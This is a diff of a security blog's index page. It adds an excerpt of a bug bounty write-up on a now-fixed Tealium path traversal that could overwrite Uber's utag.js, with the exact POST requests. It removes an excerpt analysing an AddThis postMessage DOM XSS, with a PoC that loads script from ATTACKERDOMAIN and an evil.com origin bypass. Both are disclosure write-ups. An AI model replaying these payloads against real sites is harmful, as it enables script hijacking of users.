@@ -256,6 +256,128 @@
             
               
                 
+                <a class="post-title-link" href="/2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/" itemprop="url">
+                  [BBP系列三] Hijack the JS File of Uber's Website
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2018-12-03T13:11:08+08:00" content="2018-12-03">
+              2018-12-03
+            </time>
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>Again, sorry for my poor English first of all, and I will try my best to describe this bug bounty report throughly.</p>
+<h3 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h3><ol>
+<li>Almost all of Uber’s websites are loading JS file: <a href="https://tags.tiqcdn.com/utag/uber/main/prod/utag.js" target="_blank" rel="noopener">https://tags.tiqcdn.com/utag/uber/main/prod/utag.js</a> </li>
+<li>I found that the content of utag.js is updating from <code>/data/utui/data/accounts/uber/templates/main/utag.js</code> when deploying in my.tealiumiq.com. </li>
+<li>my.tealiumiq.com has a path traversal issue, which allow hacker to change <code>utag.js</code> of other account, including Uber’s.</li>
+<li>This bug had beed fixed 8 months ago. Bug Bounty: $6000.</li>
+</ol>
+<h3 id="My-Steps"><a href="#My-Steps" class="headerlink" title="My Steps"></a>My Steps</h3><p>I like asking myself some questions when hunting for bug bounty. Looking around about <code>https://tags.tiqcdn.com/utag/uber/main/prod/utag.js</code>, I found Uber’s websites were using a third party service offered by <code>Tealium</code>. I asked myself: can I modify the content of <code>utag.js</code>? How?</p>
+<p>I registered two account and began my journey. WARNING: DO NOT TEST IN PRODUCTION USING TARGET ACCOUNT.</p>
+<p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fxtifofrypj20gh0bq0tw.jpg" alt=""></p>
+<ul>
+<li>Post <code>/urest/legacy/saveTemplate</code> with <code>profile=main%00</code> to get the path in server</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/urest/legacy/saveTemplate?utk=044925f62222711fdfec11dc6a4e7160e053d31e1a7f4774e8</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: my.tealiumiq.com</span><br><span class="line">&lt;redated&gt;</span><br><span class="line"></span><br><span class="line">account=evilaccount&amp;profile=main%00&amp;type=profile&amp;template=profile.loader&amp;code=%2F%2F+console.log(1)%3B%0A%0Aconsole.log(1)%3B</span><br></pre></td></tr></table></figure>
+<p>Response<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">"message"</span> : <span class="string">"There was an error updating this template: /data/utui/data/accounts/evilaccount/templates/main/utag.js"</span>&#125;</span><br></pre></td></tr></table></figure></p>
+<p>As you can see, the <code>utag.loader</code> template path is <code>/data/utui/data/accounts/evilaccount/templates/main/utag.js</code></p>
+<ul>
+<li>Change the requst body to update the revision.loader</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/urest/legacy/saveTemplate?utk=688b137d1b8d8e884b3e1be4cd689843d0e3bc9705665f059b</span> HTTP/1.1</span><br><span class="line"></span><br><span class="line">account=evilaccount&amp;profile=main%00&amp;type=revision&amp;template=revision.loader&amp;code=thisisatest&amp;revision=201804081230</span><br></pre></td></tr></table></figure>
+<p>Response<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">"message"</span> : <span class="string">"There was an error updating this template: /data/utui/data/accounts/evilaccount/templates/main/201804081230/utag.js"</span>&#125;</span><br></pre></td></tr></table></figure></p>
+<p>As you can see <code>201804081230</code> is appearing at the path. After testing, I found that I can insert <code>../</code> into this path, which means that I can change utag.js of any account, including Uber’s.</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/urest/legacy/saveTemplate?utk=688b137d1b8d8e884b3e1be4cd689843d0e3bc9705665f059b</span> HTTP/1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">account=evilaccount&amp;profile=main&amp;type=revision&amp;template=revision.loader&amp;code=thisisatest&amp;revision=201804081230/../../../../&lt;victimaccount&gt;/templates/main</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2017/08/30/Uber-XSS-via-Cookie/" itemprop="url">
                   [BBP系列二] Uber XSS via Cookie
                 </a>
@@ -368,141 +490,6 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/12/25/DOM-XSS-Caused-by-AddThis/" itemprop="url">
-                  分享插件AddThis导致的DOM XSS
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-12-25T14:03:41+08:00" content="2016-12-25">
-              2016-12-25
-            </time>
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/12/25/DOM-XSS-Caused-by-AddThis/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/12/25/DOM-XSS-Caused-by-AddThis/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>说明：这个漏洞是 <a href="https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/" target="_blank" rel="noopener">https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/</a> 修复的绕过，目前已经报告给AddThis并得到修复。</p>
-<blockquote>
-<p>AddThis是由多姆·沃纳伯格（Dom Vonarburg）创立并由Clearspring公司拥有的一个社会性书签服务。它可以与网站进行整合，访客即可用它将网站上的某些内容通过其他网络服务收藏或分享，诸如Facebook、MySpace、Google书签、Twitter等<br>From <a href="https://zh.wikipedia.org/wiki/AddThis" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/AddThis</a></p>
-</blockquote>
-<p>使用的例子有：</p>
-<p><img src="http://ww4.sinaimg.cn/large/7184df6bgw1fb30n0dmyqj20nd08o0wd.jpg" alt=""></p>
-<p><img src="http://ww4.sinaimg.cn/large/7184df6bgw1fb30nhwnasj20rq0bddho.jpg" alt=""></p>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>使用这款插件，需要在网页上加入类似以下的代码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Go to www.addthis.com/dashboard to customize your tools --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-538ceb912f1cca19"</span> <span class="attr">async</span>=<span class="string">"async"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>当插件加载完成后，就会监听<code>message</code>事件。</p>
-<p><img src="http://ww3.sinaimg.cn/large/7184df6bgw1fb3110ele5j21340em79m.jpg" alt=""></p>
-<p>看完前面提到的那篇文章之后，我们可以知道在这个事件处理函数中，如果<code>message</code>事件处理函数接收到一个 <em>合法来源</em> 的消息，消息内容如下：<code>at-share-bookmarklet://example.com/xss.js</code>时，就会动态在页面中插入指定的JS脚本。之前的漏洞是在这里根本没有检查消息的来源就直接加载执行导致了DOM XSS，原先的PoC：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"frame"</span> <span class="attr">src</span>=<span class="string">"https://targetpage/using_addthis"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">'frame'</span>).contentWindow.postMessage(<span class="string">'at-share-bookmarklet://ATTACKERDOMAIN/xss.js'</span>, <span class="string">'*'</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>AddThis对这个漏洞进行的修复如下：</p>
-<ol>
-<li>添加检查当前窗口是不是被嵌套在：<code>iframe</code>, <code>frame</code>等标签里，如果是，则不监听<code>message</code>事件。</li>
-<li>检查来源</li>
-</ol>
-<p>修复后的代码如下：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">, c = <span class="built_in">window</span>.parent === <span class="built_in">window</span>;</span><br><span class="line">...</span><br><span class="line">c &amp;&amp; u(<span class="built_in">window</span>, <span class="string">"message"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (e) &#123;</span><br><span class="line">      <span class="keyword">var</span> t = _atr.substring(<span class="number">0</span>, _atr.length - <span class="number">1</span>)</span><br><span class="line">        , n = e.origin.indexOf(t) === <span class="string">"https:"</span>.length || e.origin.indexOf(t) === <span class="string">"http:"</span>.length || <span class="regexp">/^https?:\/\/(localhost:\d+|localhost$)/</span>.test(e.origin)</span><br><span class="line">        , o = <span class="string">"string"</span> == <span class="keyword">typeof</span> e.data;</span><br><span class="line">      <span class="keyword">if</span> (o &amp;&amp; n) &#123;</span><br><span class="line">          <span class="keyword">var</span> a = e.data.match(<span class="regexp">/at\-share\-bookmarklet\:(.+?)$/</span>) || []</span><br><span class="line">            , i = a[<span class="number">1</span>];</span><br><span class="line">          <span class="keyword">if</span> (i) &#123;</span><br><span class="line">              <span class="keyword">try</span> &#123;</span><br><span class="line">                  _ate.menu.close()</span><br><span class="line">              &#125; <span class="keyword">catch</span> (s) &#123;&#125;</span><br><span class="line">              r(i)</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
-<ol>
-<li>其中<code>_attr</code>的值为<code>//s7.addthis.com/</code>，那么<code>t</code>的值就是<code>//s7.addthis.com</code></li>
-<li><code>e.origin</code>是调用了<code>postMessage</code>这个API的来源</li>
-<li>什么时候<code>o &amp;&amp; n</code>的值会是真呢？例如站点：<code>http://s7.addthis.com/</code>向目标站点发送消息的时候</li>
-</ol>
-<p>但这个修复真的没有问题了吗？在使用postMessage进行跨域通信的时候，有以下几种场景：</p>
-<ol>
-<li>父窗口与iframe，frame等标签里的子网页进行通信，即上面那个PoC</li>
-<li><p>使用window.open打开一个新的窗口</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> win = <span class="built_in">window</span>.open(<span class="string">"http://target.com/index.html"</span>);</span><br><span class="line">win.postMessage(<span class="string">"this is a message"</span>, <span class="string">"*"</span>);</span><br></pre></td></tr></table></figure>
-<p><code>http://target.com/index.html</code>这个页面就可以监听<code>message</code>事件获取到以上的消息。</p>
-</li>
-</ol>
-<p>也就是说，对于一个安装了这个插件的目标站点，我们依旧可以通过方法2发送一个消息给他。另外，这里的域名检查也不完善，简单的说，只要是<code>s7.addthis.com</code>开头的域名都是合法的，如<code>s7.addthis.com.evil.com</code></p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; e.origin = <span class="string">'http://s7.addthis.com.evil.com'</span></span><br><span class="line">&gt; e.origin.indexOf(t) === <span class="string">"http:"</span>.length</span><br><span class="line">&lt; <span class="literal">true</span></span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -548,7 +535,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">19</span>
+              <span class="site-state-item-count">20</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
